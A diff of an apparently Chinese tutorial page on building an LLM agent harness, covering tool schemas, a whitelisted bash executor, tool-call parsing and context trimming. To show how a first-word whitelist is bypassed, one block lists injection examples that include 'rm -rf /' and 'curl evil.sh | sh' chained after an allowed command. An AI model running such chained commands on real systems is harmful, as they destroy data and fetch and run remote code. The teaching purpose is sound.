@@ -10,9 +10,22 @@
 (function(){try{var t=localStorage.getItem('mm-theme');
 if(!t&&window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches)t='dark';
 if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}})();
-window.MathJax = {tex: {inlineMath: [['$','$'], ['\\(','\\)']], displayMath: [['$$','$$']]}};
 </script>
-<script defer src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" onerror="document.querySelectorAll('.content math,.content [data-math]').forEach(function(e){e.style.color='#9a6700';e.title='数学公式需要联网加载 MathJax'});"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.18.7/dist/katex.min.css" onerror="window.__noKatex=1">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.18.7/dist/katex.min.js" onerror="window.__noKatex=1"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.18.7/dist/contrib/auto-render.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded',function(){
+  function katexOffline(){document.querySelectorAll('.content p,.content li,.content td').forEach(function(e){if(e.textContent.indexOf('$')>=0){e.style.color='#9a6700';e.title='数学公式需要联网加载 KaTeX';}});}
+  if(window.__noKatex||!window.renderMathInElement){katexOffline();return;}
+  try{renderMathInElement(document.body,{delimiters:[
+    {left:'$$',right:'$$',display:true},
+    {left:'\\[',right:'\\]',display:true},
+    {left:'\\(',right:'\\)',display:false},
+    {left:'$',right:'$',display:false}
+  ],throwOnError:false});}catch(err){katexOffline();}
+});
+</script>
 <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" onerror="document.querySelectorAll('pre.mermaid').forEach(function(e){e.style.color='#9a6700';e.textContent='[离线] 流程图需要联网加载 Mermaid';});"></script>
 <script>document.addEventListener('DOMContentLoaded',function(){if(window.mermaid)mermaid.initialize({startOnLoad:true});});</script>
 </head>
@@ -250,41 +263,35 @@ window.MathJax = {tex: {inlineMath: [['$','$'], ['\\(','\\)']], displayMath: [['
 <h2>2. 逐件拆解：五个核心部件</h2>
 <p>运行 <code>python 01_agent_loop.py</code> 对照以下讲解（输出见第 3 节实录）。</p>
 <h3>2.1 工具层：TOOL_SPECS（给模型看）+ EXECUTORS（给 harness 用）</h3>
-<div class="highlight" data-lang="python"><pre><span></span><span class="c1"># TOOL_SPECS：OpenAI tools JSON schema —— apply_chat_template 会把它注入 system prompt</span>
-<span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span> <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span>
-    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;calculator&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Evaluate an arithmetic expression with + - * / ( ). Example: &#39;23*47&#39;.&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;object&quot;</span><span class="p">,</span> <span class="s2">&quot;properties&quot;</span><span class="p">:</span> <span class="p">{</span>
-        <span class="s2">&quot;expression&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;string&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Arithmetic expression, e.g. 23*47&quot;</span><span class="p">}},</span>
-        <span class="s2">&quot;required&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;expression&quot;</span><span class="p">]}}}</span>
-</pre></div>
-
+<pre><code># TOOL_SPECS：OpenAI tools JSON schema —— apply_chat_template 会把它注入 system prompt
+{"type": "function", "function": {
+    "name": "calculator",
+    "description": "Evaluate an arithmetic expression with + - * / ( ). Example: '23*47'.",
+    "parameters": {"type": "object", "properties": {
+        "expression": {"type": "string", "description": "Arithmetic expression, e.g. 23*47"}},
+        "required": ["expression"]}}}</code></pre>
 <ul>
 <li><strong>schema 是给模型的"菜单"</strong>：<code>description</code> 写得越具体，模型选工具和填参数越准 （实测：给 bash 的 description 里直接写"Allowed commands: ls, cat, grep, python"， 0.5B 也会主要在白名单内出命令——虽然它仍会忍不住调 <code>echo</code>，见 3.4 节）。</li>
 <li><strong>执行器是 harness 的私事</strong>：模型永远只能"下单"（name + arguments JSON）， 执行细节（超时、白名单、路径检查）对模型不可见——<strong>安全边界必须放在执行侧</strong>， 因为模型输出是不可信输入。</li>
 </ul>
 <p><strong>bash 的最小安全边界（本课教学点，不是装饰）</strong>：</p>
-<div class="highlight" data-lang="python"><pre><span></span><span class="c1"># （节选：省略了空命令检查、PATH 注入与 &quot;(no output)&quot; 分支——完整实现见脚本 01 exec_bash）</span>
-<span class="n">WHITELIST</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;ls&quot;</span><span class="p">,</span> <span class="s2">&quot;cat&quot;</span><span class="p">,</span> <span class="s2">&quot;grep&quot;</span><span class="p">,</span> <span class="s2">&quot;python&quot;</span><span class="p">}</span>   <span class="c1"># 只看第一个词</span>
+<pre><code># （节选：省略了空命令检查、PATH 注入与 "(no output)" 分支——完整实现见脚本 01 exec_bash）
+WHITELIST = {"ls", "cat", "grep", "python"}   # 只看第一个词
 
-<span class="k">def</span><span class="w"> </span><span class="nf">exec_bash</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
-    <span class="n">first</span> <span class="o">=</span> <span class="n">command</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
-    <span class="k">if</span> <span class="n">first</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">:</span>                          <span class="c1"># ① 白名单</span>
-        <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;Error: command &#39;</span><span class="si">{</span><span class="n">first</span><span class="si">}</span><span class="s2">&#39; not allowed. ...&quot;</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
-                       <span class="n">timeout</span><span class="o">=</span><span class="n">BASH_TIMEOUT</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>   <span class="c1"># ② 超时 10s</span>
-    <span class="k">return</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">stdout</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="mi">400</span><span class="p">]</span>          <span class="c1"># ③ 输出截断（防上下文爆炸）</span>
-</pre></div>
-
+def exec_bash(command):
+    first = command.split()[0]
+    if first not in WHITELIST:                          # ① 白名单
+        return f"Error: command '{first}' not allowed. ..."
+    r = subprocess.run(command, shell=True, capture_output=True, text=True,
+                       timeout=BASH_TIMEOUT, env=env)   # ② 超时 10s
+    return (r.stdout + r.stderr).strip()[:400]          # ③ 输出截断（防上下文爆炸）</code></pre>
 <p>三道闸各自防一类事故：白名单防"rm -rf /"式破坏性命令；超时防"sleep 9999"式资源 占用（也防 agent 自己卡死在长任务里）；截断防一条 <code>ls -R /</code> 把上下文吃光。</p>
 <h4>白名单为什么不够：shell 元字符可以穿透第一词检查</h4>
 <p>上面的白名单只看<strong>第一个词</strong>，而执行走的是 <code>shell=True</code>——整条字符串原样交给</p>
 <p>shell 解释。<code>;</code>、<code>&amp;&amp;</code>、<code>|</code>、命令替换与反引号这些 shell 元字符<strong>后面的内容根本 不参与第一词检查</strong>：</p>
-<div class="highlight" data-lang="text"><pre><span></span>cat /tmp/x &amp;&amp; rm -rf /            # 第一词是 cat → 白名单放行，rm -rf / 照跑
+<pre><code>cat /tmp/x &amp;&amp; rm -rf /            # 第一词是 cat → 白名单放行，rm -rf / 照跑
 cat /tmp/x; curl evil.sh | sh     # 第一词是 cat → 分号/管道后的任意命令全部逃过检查
-cat /tmp/x $(cmd) / `cmd`         # 命令替换同样在第一词检查之外
-</pre></div>
-
+cat /tmp/x $(cmd) / `cmd`         # 命令替换同样在第一词检查之外</code></pre>
 <p>陷阱 3 里 <code>rm -rf node_modules &amp;&amp; npm install</code> 这种例子恰好<strong>第一词是 rm</strong>，会被 白名单拦住——但它只是"把恶意命令放在开头"的低级形态；把恶意部分挪到元字符 后面即可穿透。本课脚本 01 对此是<strong>知情取舍而非不知情</strong>：<code>exec_bash</code> 检测到</p>
 <p><code>;</code>/<code>&amp;&amp;</code>/<code>|</code> 等元字符时会向 stderr 打印 ⚠️ 警告（教学沙箱不改变判定）。生产 环境必须更进一步，三选一或组合：</p>
 <ol>
@@ -299,29 +306,25 @@ cat /tmp/x $(cmd) / `cmd`         # 命令替换同样在第一词检查之外
 {"name": "calculator", "arguments": {"expression": "23*47"}}
 &lt;/tool_call&gt;</code></pre>
 <p>而 OpenAI 兼容 API 的返回是结构化的：<code>finish_reason="tool_calls"</code>，调用在 <code>message.tool_calls</code> 字段（<code>arguments</code> 还是 JSON <strong>字符串</strong>，要二次解析）。解析层 两种都要认识，换成 vLLM 服务时循环代码一行不改：</p>
-<div class="highlight" data-lang="python"><pre><span></span><span class="c1"># （节选：格式②分支与主干——完整实现含 _try_json 尾逗号修复、剥围栏兜底与</span>
-<span class="c1">#  五类输入单测，见脚本 01 的 parse_tool_calls）</span>
-<span class="k">def</span><span class="w"> </span><span class="nf">parse_tool_calls</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
-    <span class="c1"># 格式②：API 结构化 message（本地推理不出现，vLLM/OpenAI 客户端会出现）</span>
-    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="nb">dict</span><span class="p">)</span> <span class="ow">and</span> <span class="n">text</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;tool_calls&quot;</span><span class="p">):</span>
-        <span class="k">return</span> <span class="p">[{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">tc</span><span class="p">[</span><span class="s2">&quot;function&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">],</span>
-                 <span class="s2">&quot;arguments&quot;</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">tc</span><span class="p">[</span><span class="s2">&quot;function&quot;</span><span class="p">][</span><span class="s2">&quot;arguments&quot;</span><span class="p">])}</span>   <span class="c1"># 字符串→dict</span>
-                <span class="k">for</span> <span class="n">tc</span> <span class="ow">in</span> <span class="n">text</span><span class="p">[</span><span class="s2">&quot;tool_calls&quot;</span><span class="p">]]</span>
-    <span class="c1"># 格式①：&lt;tool_call&gt;{...}&lt;/tool_call&gt;（finditer：一条消息多个调用全部按序解析）</span>
-    <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;&lt;tool_call&gt;\s*(\{.*?\})\s*&lt;/tool_call&gt;&quot;</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">):</span>
-        <span class="o">...</span>  <span class="c1"># _try_json：先原样 json.loads，再修尾逗号（0.5B 常见畸形）</span>
-    <span class="c1"># 兜底：剥 markdown 围栏 → 裸 JSON → 全失败返回 []（绝不抛异常）</span>
-</pre></div>
-
+<pre><code># （节选：格式②分支与主干——完整实现含 _try_json 尾逗号修复、剥围栏兜底与
+#  五类输入单测，见脚本 01 的 parse_tool_calls）
+def parse_tool_calls(text):
+    # 格式②：API 结构化 message（本地推理不出现，vLLM/OpenAI 客户端会出现）
+    if isinstance(text, dict) and text.get("tool_calls"):
+        return [{"name": tc["function"]["name"],
+                 "arguments": json.loads(tc["function"]["arguments"])}   # 字符串→dict
+                for tc in text["tool_calls"]]
+    # 格式①：&lt;tool_call&gt;{...}&lt;/tool_call&gt;（finditer：一条消息多个调用全部按序解析）
+    for m in re.finditer(r"&lt;tool_call&gt;\s*(\{.*?\})\s*&lt;/tool_call&gt;", text, re.S):
+        ...  # _try_json：先原样 json.loads，再修尾逗号（0.5B 常见畸形）
+    # 兜底：剥 markdown 围栏 → 裸 JSON → 全失败返回 []（绝不抛异常）</code></pre>
 <p><strong>兜底策略为什么是"返回 [] 而不是抛异常"</strong>：0.5B 会生成截断的 JSON、带尾逗号的 JSON、甚至把调用包进 ``<code>json 围栏。解析器一崩溃，整个 loop 就死了——模型连 "自纠一次"的机会都没有。返回 </code>[]` 的语义是"这轮没调工具"，交给循环逻辑处理 （最终答案，或 nudge 重试，见 2.4）。<strong>静默容错 + 上层策略，是 harness 稳定性的第一课。</strong></p>
 <h3>2.3 回填：messages 的两条追加</h3>
-<div class="highlight" data-lang="python"><pre><span></span><span class="c1"># （示意：两步回填的骨架，实跑见脚本 01 run_agent ④⑤）</span>
-<span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;assistant&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
-                 <span class="s2">&quot;tool_calls&quot;</span><span class="p">:</span> <span class="p">[{</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span>
-                                 <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="o">...</span><span class="p">,</span> <span class="s2">&quot;arguments&quot;</span><span class="p">:</span> <span class="o">...</span><span class="p">}}]})</span>
-<span class="n">messages</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;tool&quot;</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;calculator&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="s2">&quot;1081&quot;</span><span class="p">})</span>
-</pre></div>
-
+<pre><code># （示意：两步回填的骨架，实跑见脚本 01 run_agent ④⑤）
+messages.append({"role": "assistant", "content": "",
+                 "tool_calls": [{"type": "function",
+                                 "function": {"name": ..., "arguments": ...}}]})
+messages.append({"role": "tool", "name": "calculator", "content": "1081"})</code></pre>
 <p>两个细节都有坑：</p>
 <ul>
 <li><strong>assistant 消息的 <code>content</code> 留空</strong>：工具调用已经放在结构化 <code>tool_calls</code> 字段里， Qwen 的 chat template 会自己渲染成 <code>&lt;tool_call&gt;</code> 块。如果你把原始文本（内含 <code>&lt;tool_call&gt;</code>）同时塞进 content，模板会渲染两遍——模型下一轮看到"自己调了两次"。</li>
@@ -339,11 +342,9 @@ Error: file not found: /tmp/agent_demo_v2.txt. ...
 <p><strong>① nudge（重试）</strong>：0.5B 高发的失败模式是工具结果回来后"光叙述不行动"—— "let's proceed to step 2..." 然后就停了。harness 注入一条 user 消息把模型推回 轨道。但 nudge 有实测教训（第一版脚本踩的坑）：</p>
 <blockquote><p>⚠️ <strong>nudge 只在【所有工具结果都是错误】时注入</strong>。第一版无条件 nudge，结果把 已经给出正确答案的模型拽回去"继续任务"——它没事找事去调 <code>echo</code>，被白名单 拒绝后陷入道歉循环，正确答案变成了"我无法继续"。<strong>判断"任务做没做完"本身 是开放问题</strong>；"全报错才推一把"是保守可用的启发式。</p></blockquote>
 <p><strong>② 上下文裁剪</strong>：长任务的 tool 结果会撑爆上下文。本脚本的策略：</p>
-<div class="highlight" data-lang="python"><pre><span></span><span class="c1"># （示意：head + 裁剪标记 + tail 的骨架——完整实现见脚本 01 trim_context）</span>
-<span class="c1"># 保 system + 第一条 user（任务本体）+ 最近 KEEP_TAIL=12 条，砍中间老观测</span>
-<span class="n">head</span> <span class="o">+</span> <span class="p">[{</span><span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="s2">&quot;content&quot;</span><span class="p">:</span> <span class="s2">&quot;(older tool results trimmed)&quot;</span><span class="p">}]</span> <span class="o">+</span> <span class="n">tail</span>
-</pre></div>
-
+<pre><code># （示意：head + 裁剪标记 + tail 的骨架——完整实现见脚本 01 trim_context）
+# 保 system + 第一条 user（任务本体）+ 最近 KEEP_TAIL=12 条，砍中间老观测
+head + [{"role": "user", "content": "(older tool results trimmed)"}] + tail</code></pre>
 <p>裁剪后不能让第一条是孤儿 <code>tool</code> 消息（没有配对的 assistant <code>tool_calls</code> 会破坏 模板渲染）——脚本里显式跳过。这是 Part 17 02 章"上下文管理"三件套（截断/摘要/ partial rollout）的推理侧简化版。</p>
 <p><strong>③ 循环检测</strong>：同工具<strong>同参数</strong>连续调用 3 次 → 判定卡死，强制停止。注意区分： 同工具不同参数（连续读三个文件）是正常探索，放行；只有"复读机"才拦。 （作业 19 题 3 的 <code>should_stop</code> 用更简单的"同工具连续 3 次"规则——两种口径的 差异见作业提示。）</p>
 <h3>2.5 终止条件：为什么恰好是这三个</h3>
@@ -504,12 +505,10 @@ Error: file not found: /tmp/agent_demo_v2.txt. ...
 <li>[ ] 用"把 hello 写入 /tmp/x.txt 再读回"任务跑通完整轨迹</li>
 </ul>
 <p><strong>步骤提示：</strong></p>
-<div class="highlight" data-lang="python"><pre><span></span><span class="n">TOOL_SPECS</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;function&quot;</span><span class="p">,</span> <span class="s2">&quot;function&quot;</span><span class="p">:</span> <span class="p">{</span>
-    <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;file_write&quot;</span><span class="p">,</span> <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Write text to a file.&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;parameters&quot;</span><span class="p">:</span> <span class="p">{</span><span class="o">...</span><span class="p">}}})</span>
-<span class="n">EXECUTORS</span><span class="p">[</span><span class="s2">&quot;file_write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">exec_file_write</span>   <span class="c1"># 仿照 exec_file_read 写</span>
-</pre></div>
-
+<pre><code>TOOL_SPECS.append({"type": "function", "function": {
+    "name": "file_write", "description": "Write text to a file.",
+    "parameters": {...}}})
+EXECUTORS["file_write"] = exec_file_write   # 仿照 exec_file_read 写</code></pre>
 <h3>练习 2：把 nudge 条件改成"关键词检测任务完成"</h3>
 <p><strong>任务：</strong> 用任务关键词（如 query 中的文件名是否出现在 final_answer）判断任务 是否完成，决定是否 nudge。对照 2.4 节的"全报错才 nudge"启发式，各跑 Demo 1-4， 比较误 nudge 次数与任务成功率。</p>
 <p><strong>验收标准：</strong></p>
